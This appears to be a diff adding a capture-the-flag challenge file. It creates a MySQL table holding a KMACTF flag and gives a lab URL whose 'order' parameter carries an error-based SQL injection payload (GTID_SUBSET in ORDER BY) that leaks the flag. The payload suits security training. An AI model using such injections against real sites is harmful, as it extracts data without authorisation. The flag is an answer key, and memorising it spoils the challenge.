@@ -1,0 +1,6 @@
+use default_db;
+create table items ( id int );
+create table flahga123456789xxsxx012xxxxxxxxx34567xx1 ( flag varchar(99) );
+insert flahga123456789xxsxx012xxxxxxxxx34567xx1 set flag='KMACTF{X_Ooooooooooooorder_By_Nooooooooooooooooooone_SQLMaaaaaaaaaaaaap?!!!!!!!!!!!!}';
+
+http://try-sqlmap.local/?order=GTID_SUBSET(CONCAT((SELECT+*+from+flahga123456789xxsxx012xxxxxxxxx34567xx1+limit+0,1)),1)
